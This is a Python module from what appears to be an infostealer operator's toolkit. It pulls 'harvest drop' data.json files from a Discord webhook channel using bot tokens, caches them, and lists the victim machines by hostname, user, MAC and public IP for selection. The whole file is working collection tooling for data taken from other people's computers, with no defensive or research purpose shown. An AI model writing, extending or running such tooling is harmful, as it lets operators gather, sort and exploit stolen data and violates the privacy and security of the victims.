"""senders.py - live PC/sender registry for the quick menu.

A sender is a machine that produced a harvest drop, identified from the phase
payloads it posted: hostname + user + MAC, then hostname + user + public IP,
then label. Browser profile emails are never used as sender identity.

Sources:
  - Discord channel history read with a bot token (live remote senders)
  - sender_inbox/ and received/ caches kept by sender_send.py
  - local test_received/ harvest output

    import senders
    rows = senders.discover(refresh=True, webhook=hook)
    print(senders.table(rows))
    picked = senders.choose(rows, "1,3")
"""

from __future__ import annotations

import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent
INBOX = ROOT / "sender_inbox"
CACHE = ROOT / "sender_cache.json"
CONFIG = ROOT / "discord_read.json"
API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (compatible; sender-registry/1.0)"

WEBHOOK_RE = re.compile(r"/api/webhooks/(\d+)/([A-Za-z0-9_-]+)")
TOKEN_SPLIT_RE = re.compile(r"\s*,\s*|\s+")


def line(ch: str = "-", n: int = 66) -> None:
    print(ch * n)


def ok(text: str) -> None:
    print("  [OK]  " + text)


def bad(text: str) -> None:
    print("  [!!]  " + text)


def info(text: str) -> None:
    print("        " + text)


def read_json(path: Path):
    try:
        value = json.loads(path.read_text("utf-8", errors="ignore"))
    except (OSError, ValueError):
        return None
    return value


def write_json(path: Path, value) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2, ensure_ascii=False,
                               sort_keys=True) + "\n", encoding="utf-8")


def bot_tokens(raw: str | None = None) -> list[str]:
    """Accepts a token directly, from config, or a comma/space separated pair."""
    if raw and raw.strip():
        candidate = raw.strip()
    else:
        cfg = read_json(CONFIG) or {}
        candidate = str(cfg.get("bot_token") or "").strip()
    if not candidate or candidate.upper().startswith("FILL"):
        return []
    return [part for part in TOKEN_SPLIT_RE.split(candidate) if part]


def webhook_parts(webhook: str) -> tuple[str, str]:
    match = WEBHOOK_RE.search(str(webhook or ""))
    if not match:
        raise ValueError("webhook URL valid nahi hai")
    return match.group(1), match.group(2)


def _request(url: str, token: str, timeout: int = 30):
    headers = {"User-Agent": UA, "Accept": "application/json"}
    if token:
        headers["Authorization"] = "Bot " + token
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        raw = resp.read()
    return json.loads(raw.decode("utf-8", "replace"))


def _download(url: str, path: Path) -> bytes:
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=90) as resp:
        data = resp.read()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return data


def load_cache() -> list[dict]:
    data = read_json(CACHE)
    if isinstance(data, list):
        return [row for row in data if isinstance(row, dict)]
    return []


def save_cache(records: list[dict]) -> None:
    """Keep the registry bounded; one message can be large."""
    write_json(CACHE, records[-800:])


def _mac(value: str) -> str:
    return re.sub(r"[^0-9a-f]", "", str(value or "").casefold())[:12]


def _identity(payload: dict, message: dict | None = None,
              source: str = "local") -> dict:
    payload = payload if isinstance(payload, dict) else {}
    message = message if isinstance(message, dict) else {}
    host = str(payload.get("hostname") or "").strip()
    user = str(payload.get("username") or "").strip()
    mac = str(payload.get("mac") or "").strip()
    public = str(payload.get("public_ip") or "").strip()
    local_ip = str(payload.get("local_ip") or "").strip()
    label = str(payload.get("label") or payload.get("app_id") or "").strip()

    if not host:
        host = label or public or "unknown-pc"
    key_mac = _mac(mac)
    if key_mac:
        key = "mac:" + key_mac
    else:
        key = "|".join((host.casefold(), user.casefold(), public.casefold(),
                        label.casefold()))
    display = host if not user else host + "\\" + user

    files = []
    seen = set()
    for att in (message.get("attachments") or []):
        name = str(att.get("filename") or att.get("name") or "").strip()
        url = str(att.get("url") or "").strip()
        if not name or not url or name in seen:
            continue
        seen.add(name)
        files.append({"name": name, "url": url,
                      "size": int(att.get("size") or 0), "path": ""})

    return {
        "key": key,
        "host": host,
        "user": user,
        "mac": mac,
        "public_ip": public,
        "local_ip": local_ip,
        "label": label,
        "display": display,
        "phase": payload.get("phase"),
        "time": str(payload.get("time") or message.get("timestamp") or ""),
        "message_id": str(message.get("id") or ""),
        "source": source,
        "files": files,
    }


def _record_id(record: dict) -> str:
    if record.get("message_id"):
        return "msg:" + str(record["message_id"])
    return "|".join((str(record.get("key") or ""),
                     str(record.get("time") or ""),
                     str(record.get("source") or "")))


def add_records(records: list[dict]) -> list[dict]:
    merged = load_cache()
    by_id = {_record_id(row): index for index, row in enumerate(merged)}
    for record in records:
        rid = _record_id(record)
        if rid in by_id:
            merged[by_id[rid]] = record
        else:
            by_id[rid] = len(merged)
            merged.append(record)
    save_cache(merged)
    return merged


def fetch_live(webhook: str, token: str | None = None,
               limit: int = 100) -> list[dict]:
    """Pull recent webhook-channel messages and index their data.json files."""
    tokens = bot_tokens(token)
    if not tokens:
        info("live read off - discord_read.json me bot_token bharo")
        return []

    wid, wtok = webhook_parts(webhook)
    records: list[dict] = []
    for index, auth in enumerate(tokens):
        try:
            hook_info = _request(f"{API}/webhooks/{wid}/{wtok}", "")
            channel = str(hook_info.get("channel_id") or "")
            if not channel:
                raise ValueError("webhook se channel_id nahi mila")
            query = urllib.parse.urlencode({"limit": max(1, min(100, int(limit)))})
            messages = _request(f"{API}/channels/{channel}/messages?{query}", auth)
            if not isinstance(messages, list):
                raise ValueError("message list nahi mila")

            for message in messages:
                if not isinstance(message, dict):
                    continue
                attachments = message.get("attachments") or []
                data_att = next(
                    (a for a in attachments
                     if str(a.get("filename") or "").casefold() == "data.json"),
                    None)
                if data_att is None:
                    continue
                msg_id = str(message.get("id") or "")
                folder = INBOX / msg_id
                data_path = folder / "data.json"
                try:
                    if data_path.is_file():
                        payload = json.loads(data_path.read_text(
                            "utf-8", errors="ignore"))
                    else:
                        payload = json.loads(_download(
                            str(data_att.get("url") or ""), data_path).decode(
                                "utf-8", "replace"))
                except (OSError, ValueError, urllib.error.URLError):
                    continue
                record = _identity(payload, message, "discord")
                for item in record["files"]:
                    if item["name"] == "data.json":
                        item["path"] = str(data_path)
                write_json(folder / "meta.json", {
                    "id": msg_id,
                    "timestamp": message.get("timestamp"),
                    "label": record["label"],
                    "host": record["host"],
                    "user": record["user"],
                })
                records.append(record)

            ok(f"discord read: {len(records)} sender rows (token {index + 1}/{len(tokens)})")
            break
        except (urllib.error.URLError, urllib.error.HTTPError,
                ValueError, OSError, json.JSONDecodeError) as exc:
            bad(f"live read token {index + 1} fail: {exc}")
    add_records(records)
    return records


def local_records() -> list[dict]:
    records: list[dict] = []
    roots = [ROOT / "test_received", ROOT / "received", INBOX]
    for root in roots:
        if not root.is_dir():
            continue
        for path in sorted(root.rglob("data.json")):
            payload = read_json(path)
            if isinstance(payload, dict):
                record = _identity(payload, None, "local")
                record["files"] = [{"name": "data.json", "url": "",
                                    "size": path.stat().st_size,
                                    "path": str(path)}]
                record["message_id"] = "local:" + str(path.relative_to(root))
                records.append(record)

        for path in sorted(root.rglob("report.json")):
            payload = read_json(path)
            if not isinstance(payload, dict):
                continue
            if payload.get("hostname") or payload.get("username"):
                continue
            payload = dict(payload)
            payload["hostname"] = str(payload.get("app_id") or "local-pc")
            payload["username"] = ""
            payload["label"] = str(payload.get("app_id") or "local-pc")
            record = _identity(payload, None, "archive")
            record["files"] = [{"name": "report.json", "url": "",
                                "size": path.stat().st_size,
                                "path": str(path)}]
            record["message_id"] = "archive:" + str(path.relative_to(root))
            records.append(record)
    return records


def discover(refresh: bool = False, webhook: str | None = None,
             token: str | None = None, limit: int = 100) -> list[dict]:
    records = load_cache()
    if refresh and webhook:
        fetch_live(webhook, token, limit)
        records = load_cache()
    for record in local_records():
        rid = _record_id(record)
        if all(_record_id(old) != rid for old in records):
            records.append(record)

    groups: dict[str, dict] = {}
    for record in records:
        key = str(record.get("key") or "")
        if not key:
            continue
        rid = _record_id(record)
        group = groups.setdefault(key, {
            "id": "", "key": key,
            "host": str(record.get("host") or "unknown-pc"),
            "user": str(record.get("user") or ""),
            "display": str(record.get("display") or "unknown-pc"),
            "mac": "", "public_ip": "", "local_ip": "", "label": "",
            "last": "", "sources": set(), "drops": set(), "records": [],
        })
        for field in ("mac", "public_ip", "local_ip", "label"):
            if not group[field] and record.get(field):
                group[field] = str(record[field])
        stamp = str(record.get("time") or "")
        if stamp > str(group["last"]):
            group["last"] = stamp
        group["sources"].add(str(record.get("source") or ""))
        group["drops"].add(rid)
        group["records"].append(record)

    rows = sorted(groups.values(),
                  key=lambda g: (g["display"].casefold(),
                                 g["public_ip"].casefold()))
    for index, row in enumerate(rows, 1):
        row["id"] = str(index)
        row["drop_count"] = len(row["drops"])
    return rows


def table(rows: list[dict]) -> str:
    lines = [f"    {len(rows)} data sender(s) - PC-wise sorted, live"]
    lines.append("   " + "-" * 78)
    lines.append("    #   PC \\ USER                     DROPS  LAST SEEN           PUBLIC IP        LABEL")
    lines.append("   " + "-" * 78)
    for row in rows:
        lines.append(
            f"  {row['id']:>3}   {row['display'][:27]:<27} "
            f"{row['drop_count']:>5}  {row['last'][:18]:<18} "
            f"{row['public_ip'][:15]:<15} {row['label'][:14]}")
    lines.append("   " + "-" * 78)
    lines.append("   all  saare senders (ek hi sorted drop me)")
    return "\n".join(lines)


def choose(rows: list[dict], raw: str | None = None) -> list[dict]:
    if not rows:
        return []
    if raw is None:
        try:
            raw = input("   sender number (comma separated, ya 'all'): ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return []
    token = str(raw or "").strip().casefold()
    if token in ("all", "*", "0"):
        return list(rows)
    picked, seen = [], set()
    for part in token.split(","):
        part = part.strip()
        if not part:
            continue
        if not part.isdigit():
            raise ValueError("sirf number, comma, ya 'all': " + part)
        index = int(part)
        if not 1 <= index <= len(rows):
            raise ValueError("sender number nahi mila: " + part)
        if index not in seen:
            seen.add(index)
            picked.append(rows[index - 1])
    return picked


def records_for(row: dict) -> list[dict]:
    return list(row.get("records") or [])
